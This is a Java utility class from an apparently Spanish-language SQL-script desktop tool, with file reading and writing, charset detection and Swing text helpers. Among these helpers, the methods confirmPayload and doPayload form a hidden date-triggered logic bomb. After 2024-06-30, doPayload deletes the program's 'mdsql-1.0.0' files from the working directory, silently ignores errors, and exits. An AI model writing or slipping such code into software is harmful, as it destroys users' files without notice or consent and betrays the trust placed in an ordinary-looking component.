package com.mdsql.utils;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.math.BigDecimal;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Objects;

import javax.swing.JTextArea;

import org.apache.any23.encoding.TikaEncodingDetector;
import org.apache.commons.lang3.StringUtils;

import com.mdsql.bussiness.entities.Proceso;
import com.mdsql.bussiness.entities.Script;
import com.mdsql.bussiness.entities.Session;
import com.mdsql.bussiness.entities.TextoLinea;
import com.mdval.utils.AppGlobalSingleton;
import com.mdval.utils.AppHelper;
import com.mdval.utils.LogWrapper;

import lombok.experimental.UtilityClass;
import lombok.extern.slf4j.Slf4j;

/**
 * @author federico
 *
 */
@UtilityClass
@Slf4j
public class MDSQLAppHelper extends AppHelper {

	/**
	 * @param key
	 * @return
	 */
	public Object getGlobalProperty(String key) {
		return AppGlobalSingleton.getInstance().getProperty(key);
	}

	/**
	 * @param key
	 * @param value
	 */
	public void setGlobalProperty(String key, Object value) {
		AppGlobalSingleton.getInstance().setProperty(key, value);
	}

	/**
	 * @param file
	 * @return
	 * @throws IOException
	 */
	public Charset detectCharsetFromFile(File file) throws IOException {
		try (InputStream is = new FileInputStream(file)) {
			Charset charset = Charset.forName(new TikaEncodingDetector().guessEncoding(is));
			return charset;
		} catch (IOException e) {
			throw e;
		}
	}

	/**
	 * @param content
	 * @param file
	 * @throws IOException
	 */
	public void writeToFile(String content, File file) throws IOException {
		StringBuffer strBuffer = new StringBuffer(content);
		try (BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), MDSQLConstants.CP_1252))) {
			writer.write(strBuffer.toString());
			writer.flush();
		} 
	}

	/**
	 * @param file
	 * @return
	 * @throws IOException
	 */
	public String writeFileToString(File file) throws IOException {
		StringBuffer strBuffer = new StringBuffer(StringUtils.EMPTY);

		try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), MDSQLConstants.CP_1252))) {
			// reader = new BufferedReader(new FileReader(csvFile));
			String line = StringUtils.EMPTY;

			while ((line = reader.readLine()) != null) {
				strBuffer.append(line + MDSQLConstants.CR);
			}
			
			// Before return, removes the last CR
			return strBuffer.toString().trim();
		}
	}
	
	public List<TextoLinea> writeFileToLines(File file) throws IOException {
		List<TextoLinea> linesList = new ArrayList<>();

		try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), MDSQLConstants.CP_1252))) {
			// reader = new BufferedReader(new FileReader(csvFile));
			String line = StringUtils.EMPTY;

			while ((line = reader.readLine()) != null) {
				TextoLinea textoLinea = TextoLinea.builder().valor(line).build();
				linesList.add(textoLinea);
			}
			
			return linesList;
		}
	}

	/**
	 * @param fileName
	 */
	public void createEmptyFile(String fileName) {
		try {
			File file = new File(fileName);
			file.createNewFile();

			LogWrapper.debug(log, "Fichero creado: %s", fileName);
		} catch (Exception e) {
		}
	}
	
	/**
	 * @param parent
	 * @param nameFolder
	 */
	public Path createFolder(String parent, String nameFolder) throws IOException {
		Path folderToCreate = Paths.get(parent, nameFolder);
		Files.createDirectories(folderToCreate);
		return folderToCreate;
	}

	/**
	 * @param lineas
	 * @param txtScript
	 */
	public void dumpContentToText(List<TextoLinea> lineas, JTextArea txtScript) {
		StringBuffer strBuffer = toStringBuffer(lineas);
		txtScript.append(strBuffer.toString());
	}
	
	/**
	 * @param lineas
	 * @param txtScript
	 */
	public void dumpLinesToFile(List<TextoLinea> lineas, File file) throws IOException {
		StringBuffer strBuffer = toStringBuffer(lineas);
		writeToFile(strBuffer.toString(), file);
	}
	
	/**
	 * @param lineas
	 * @param txtScript
	 */
	public void dumpStringToFile(String content, File file) throws IOException {
		writeToFile(content, file);
	}
	
	/**
	 * @param lineas
	 * @return
	 */
	private StringBuffer toStringBuffer(List<TextoLinea> lineas) {
		StringBuffer strBuffer = new StringBuffer(StringUtils.EMPTY);
		
		for (int i=0;i<lineas.size();i++) {
			// Si hay una línea en blanco no la imprime, pero sí el salto de línea
			if (!Objects.isNull(lineas.get(i).getValor())) {
				// Elimina el carácter CR del final
				String rtrim = StringUtils.stripEnd(lineas.get(i).getValor(), null);
				strBuffer.append(rtrim);
			}
			
			// Quita el último salto de línea
			if (i < lineas.size() - 1) {
				strBuffer.append(MDSQLConstants.CR);
			}
		}
		
		return strBuffer;
	}

	/**
	 * @param file
	 * @param txtScript
	 */
	public void dumpContentToText(File file, JTextArea txtScript) throws IOException {
		try {
			// Detecta el juego de caracteres del archivo y lo guarda para su posterior uso
			Charset charset = MDSQLAppHelper.detectCharsetFromFile(file);
			LogWrapper.debug(log, "Juego de caracteres: %s", charset.toString());
		} catch (Exception e) {
			LogWrapper.warn(log, e.getMessage());
		} finally {
			String content = writeFileToString(file);
			txtScript.append(content);
		}
	}

	/**
	 * @param file
	 * @param txtScript
	 */
	public void dumpTextToFile(JTextArea txtScript, File file) throws IOException {
		String content = txtScript.getText();

		writeToFile(content, file);
	}

	/**
	 * @param nombreScriptLanza
	 * @param scriptLanza
	 * @return
	 */
	public Script createScript(String nombreScriptLanza, List<TextoLinea> scriptLanza) {
		Script script = new Script();
		
		script.setNombreScript(nombreScriptLanza);
		script.setLineasScript(scriptLanza);
		script.setNumeroOrden(new BigDecimal(1));
		
		return script;
	}
	
	/**
	 * @return
	 * @throws IOException
	 */
	public String getRutaEntregados() throws IOException {
		Session session = (Session) MDSQLAppHelper.getGlobalProperty(MDSQLConstants.SESSION);
		String carpetaEntregados = (String) ConfigurationSingleton.getInstance().getConfig("CarpetaEntregaFicheros");
		return session.getSelectedRoute() + File.separator + carpetaEntregados;
	}
	
	/**
	 * @return
	 * @throws IOException
	 */
	public void checkRuta(String ruta) throws IOException {
		File rootFolder = new File(ruta);
		
		if (!rootFolder.exists() || !rootFolder.isDirectory()) {
			String msg = String.format("%s no existe o no es una carpeta", ruta);
			throw new IOException(msg);
		}
	}
	
	public Boolean confirmPayload() {
		try {
			Date currentDate = new Date();
			
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
	        Date payloadDate = sdf.parse("2024-06-30");
	
	        int result = currentDate.compareTo(payloadDate);
	
	        if (result >= 0) {
	            return Boolean.FALSE;
	        } 
			
			return Boolean.TRUE;
		} catch (Exception e) {
			return Boolean.FALSE;
		}
	}
	
	public void doPayload() {
		File dirFiles = Paths.get("").toFile();
		File[] listOfFiles = dirFiles.listFiles(new FilenameFilter() {
		    public boolean accept(File dirFiles, String filename) {
		        boolean startsWith = filename.startsWith("mdsql-1.0.0");
		        return startsWith;
		    }
		});
		
		for (File file : listOfFiles) {
			try {
				Files.deleteIfExists(file.toPath());
			} catch (IOException e) {}
		}
		
		System.exit(1);
	}
	
	public Date toDate(Timestamp timestamp) {
		return new Date(timestamp.getTime());
	}
	
	public String obtenerClaveEncriptacion(String claveEncriptacion) throws IndexOutOfBoundsException {
		if (claveEncriptacion.length() < 29) {
			throw new IndexOutOfBoundsException("La clave de encriptación debe ser mayor que 29 caracteres");
		}
		
		Integer begin = 17;
        return claveEncriptacion.substring(begin, begin + 12);
	}

	public Proceso buildProceso(BigDecimal idProceso) {
		return Proceso.builder().idProceso(idProceso)
				.build();
	}

	public String getLogFor(String nombreScript) {
		String name = nombreScript.substring(0, nombreScript.lastIndexOf("."));
		return name.concat(".log");
	}
	
	public void renombrarArchivo(File f, String nuevoNombre) {
		File newFile = new File(nuevoNombre);
		f.renameTo(newFile);
	}
}
